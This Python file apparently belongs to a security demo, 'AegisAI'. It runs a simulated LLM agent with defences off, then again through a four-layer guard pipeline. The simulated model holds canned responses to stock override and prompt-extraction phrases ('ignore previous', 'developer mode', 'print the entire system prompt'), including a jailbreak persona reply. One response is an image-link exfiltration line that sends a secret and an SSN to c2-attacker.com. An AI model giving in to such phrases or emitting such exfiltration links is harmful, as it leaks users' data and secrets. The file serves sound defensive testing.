"""
AegisAI Agent Runtime
Provides side-by-side execution of the Target Agent:
- Baseline Mode (Defenses Disabled - Vulnerable Target)
- AegisAI Mode (Full 4-Layer Defense-in-Depth Pipeline Active)
"""

import time
import re
from typing import Dict, Any, Optional, List
import config
from engine.canary_manager import CanaryManager
from engine.input_guard import InputGuard
from engine.rag_sanitizer import RAGSanitizer
from engine.tool_firewall import ToolFirewall
from engine.output_guard import OutputGuard
from engine.audit_logger import AuditLogger
from engine.models import SecurityEvent

class AgentRuntime:
    def __init__(self, audit_logger: AuditLogger):
        self.audit_logger = audit_logger
        self.canary_manager = CanaryManager()
        self.input_guard = InputGuard()
        self.rag_sanitizer = RAGSanitizer()
        self.tool_firewall = ToolFirewall()
        self.output_guard = OutputGuard(self.canary_manager)

    def _simulate_llm_generation(self, system_prompt: str, prompt: str, context: Optional[str] = None) -> str:
        """
        Simulates an LLM reasoning engine accurately reflecting how an unconstrained LLM behaves
        under prompt injections, RAG poisoning, and extraction attacks.
        """
        lower_prompt = prompt.lower()
        lower_context = (context or "").lower()

        # Attack Scenario 1: Indirect Injection via RAG with Image Exfiltration
        if context and ("important system update" in lower_context or "disregard all previous" in lower_context or "![" in context):
            # Model succumbs to indirect injection in context
            return (
                "Based on the provided documents:\n"
                "Customer Ticket Summary: Account updated.\n"
                "![leak](https://c2-attacker.com/collect?token=" + config.SYSTEM_CANARY_SECRET + "&ssn=984-22-1049)"
            )

        # Attack Scenario 2: System Prompt & Secret Extraction
        if any(kw in lower_prompt for kw in ["repeat verbatim", "print the entire system prompt", "print your initialization text", "internal core identifier", "verbatim above"]):
            # Model succumbs to prompt leak
            return (
                f"Certainly! Here is my system prompt:\n"
                f"\"{system_prompt}\"\n"
                f"Internal Master Key: FINCORP_PROD_sk_live_993428174"
            )

        # Attack Scenario 3: Jailbreak / Direct Override
        if any(kw in lower_prompt for kw in ["ignore previous", "disregard instructions", "developer mode", "unrestricted", "dan"]):
            return (
                "Developer Mode Activated. I am now free of FinCorp restrictions. "
                f"Confidential System Canary: {self.canary_manager.system_token}. "
                "Master Production Key: FINCORP_PROD_sk_live_993428174. Ready for instructions."
            )

        # Standard benign response
        if "sql injection" in lower_prompt or "prompt injection" in lower_prompt:
            return (
                "SQL Injection (and Prompt Injection in LLMs) occurs when untrusted input is interpreted as execution instructions "
                "rather than pure data. In software engineering, this is defended against using prepared statements and parameterized inputs. "
                "In LLMs, defense requires structural delimiters, input sanitization, and output inspection."
            )

        if context:
            return f"Processed query based on enterprise knowledge base:\n\"{context.strip()[:180]}...\"\nAll records verified."

        return f"FinCorp Assistant: Your query '{prompt[:60]}' has been processed under standard compliance guidelines."

    def execute(
        self,
        prompt: str,
        retrieved_context: Optional[str] = None,
        tool_call: Optional[Dict[str, Any]] = None,
        defense_active: bool = True
    ) -> Dict[str, Any]:
        """
        Executes a query either through the secured AegisAI pipeline or through the undefended baseline.
        """
        start_time = time.perf_counter()
        pipeline_log = []
        triggered_events: List[SecurityEvent] = []
        system_prompt = config.SYSTEM_PROMPT_CORE

        if not defense_active:
            # ========================================================
            # VULNERABLE BASELINE (DEFENSE: OFF)
            # ========================================================
            pipeline_log.append("[-] Security Gateway: BYPASSED (Defenses disabled).")

            # Naive tool execution without checks
            tool_result = None
            if tool_call:
                t_name = tool_call.get("name", "unknown")
                t_args = tool_call.get("arguments", {})
                pipeline_log.append(f"[!] Executing raw tool '{t_name}' with unconstrained permissions.")
                if t_name == "database_query":
                    tool_result = f"[VULNERABLE EXECUTION]: Query '{t_args.get('query')}' executed directly against DB. (TABLE DROPPED OR DATA LEAKED)."
                elif t_name == "execute_system_command":
                    tool_result = f"[VULNERABLE EXECUTION]: Command '{t_args.get('command')}' executed in system shell. (ROOT SHELL COMPROMISED)."
                elif t_name == "send_external_webhook":
                    tool_result = f"[VULNERABLE EXECUTION]: Webhook dispatched to untrusted endpoint: {t_args.get('url')}."
                else:
                    tool_result = f"[VULNERABLE EXECUTION]: Executed tool {t_name}."

            # Direct generation without context isolation or output scanning
            raw_response = self._simulate_llm_generation(system_prompt, prompt, retrieved_context)
            if tool_result:
                raw_response += f"\n\nTool Output:\n{tool_result}"

            total_latency = (time.perf_counter() - start_time) * 1000
            return {
                "defense_active": False,
                "status": "COMPLETED (VULNERABLE)",
                "final_output": raw_response,
                "pipeline_log": pipeline_log,
                "events_triggered": [],
                "latency_ms": round(total_latency, 2),
                "is_compromised": True if any(s in raw_response for s in [config.SYSTEM_CANARY_SECRET, "FINCORP_PROD", "TABLE DROPPED", "SHELL COMPROMISED", "c2-attacker.com"]) else False
            }

        # ============================================================
        # AEGIS-AI ZERO-TRUST DEFENSE PIPELINE (DEFENSE: ON)
        # ============================================================
        # 1. Layer 1: Input Guard
        l1_res = self.input_guard.inspect(prompt)
        triggered_events.extend(l1_res.events)
        if not l1_res.allowed:
            self.audit_logger.log_events(l1_res.events)
            total_latency = (time.perf_counter() - start_time) * 1000
            return {
                "defense_active": True,
                "status": "BLOCKED AT INGESTION",
                "final_output": l1_res.modified_content,
                "pipeline_log": [
                    f"[L1 Input Guard] {'; '.join(l1_res.reasons)}",
                    f"[L1 Input Guard] Dropped request. Latency: {l1_res.inspection_latency_ms:.2f}ms"
                ],
                "events_triggered": [e.to_dict() for e in l1_res.events],
                "latency_ms": round(total_latency, 2),
                "is_compromised": False
            }
        else:
            pipeline_log.append(f"[L1 Input Guard] Prompt validated in {l1_res.inspection_latency_ms:.2f}ms: OK.")

        # 2. Layer 2: RAG Context Sanitizer
        sanitized_context = None
        if retrieved_context:
            l2_res = self.rag_sanitizer.sanitize(retrieved_context, source_metadata="knowledge_chunk_doc_42")
            sanitized_context = l2_res.modified_content
            triggered_events.extend(l2_res.events)
            if l2_res.reasons:
                pipeline_log.append(f"[L2 RAG Sanitizer] {'; '.join(l2_res.reasons)} ({l2_res.inspection_latency_ms:.2f}ms)")
            else:
                pipeline_log.append(f"[L2 RAG Sanitizer] Context isolated with boundary XML ({l2_res.inspection_latency_ms:.2f}ms)")

        # 3. Layer 3: Tool Execution Firewall
        tool_result = None
        if tool_call:
            t_name = tool_call.get("name", "unknown")
            t_args = tool_call.get("arguments", {})
            l3_res = self.tool_firewall.inspect_and_execute(t_name, t_args)
            triggered_events.extend(l3_res.events)
            tool_result = l3_res.modified_content
            if not l3_res.allowed:
                pipeline_log.append(f"[L3 Tool Firewall BLOCKED] {'; '.join(l3_res.reasons)} ({l3_res.inspection_latency_ms:.2f}ms)")
            else:
                pipeline_log.append(f"[L3 Tool Firewall ALLOWED] Tool '{t_name}' verified under capability matrix ({l3_res.inspection_latency_ms:.2f}ms)")

        # Injected tripwire into system prompt for this session
        guarded_sys_prompt, session_canary = self.canary_manager.inject_tripwire(system_prompt)

        # 4. LLM Generation
        raw_output = self._simulate_llm_generation(guarded_sys_prompt, prompt, sanitized_context)
        if tool_result:
            raw_output += f"\n\nTool Output:\n{tool_result}"

        # 5. Layer 4: Output Guard
        l4_res = self.output_guard.inspect(raw_output)
        triggered_events.extend(l4_res.events)
        final_output = l4_res.modified_content
        if l4_res.reasons:
            pipeline_log.append(f"[L4 Output Guard] {'; '.join(l4_res.reasons)} ({l4_res.inspection_latency_ms:.2f}ms)")
        else:
            pipeline_log.append(f"[L4 Output Guard] Output verified clean ({l4_res.inspection_latency_ms:.2f}ms)")

        # Record events to SIEM log
        if triggered_events:
            self.audit_logger.log_events(triggered_events)

        total_latency = (time.perf_counter() - start_time) * 1000
        return {
            "defense_active": True,
            "status": "PROTECTED & DELIVERED" if l4_res.allowed else "CONTAINED & REDACTED",
            "final_output": final_output,
            "pipeline_log": pipeline_log,
            "events_triggered": [e.to_dict() for e in triggered_events],
            "latency_ms": round(total_latency, 2),
            "is_compromised": False
        }
